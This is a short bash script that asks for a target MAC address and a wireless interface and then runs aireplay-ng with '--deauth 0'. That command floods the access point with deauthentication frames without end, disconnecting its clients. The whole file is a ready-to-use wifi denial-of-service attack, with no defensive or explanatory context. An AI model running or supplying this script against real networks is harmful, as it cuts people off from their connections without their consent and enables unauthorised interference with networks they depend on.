#!/bin/bash

# Prompt the user to enter the MAC address
read -p "Enter the MAC address: " mac_address

# Prompt the user to enter the network interface, default to wlan0mon if no input
read -p "Enter the network interface (default: wlan0mon): " interface
interface=${interface:-wlan0mon}

# Run the aireplay-ng command with the provided MAC address and interface
sudo aireplay-ng --deauth 0 -a "$mac_address" "$interface"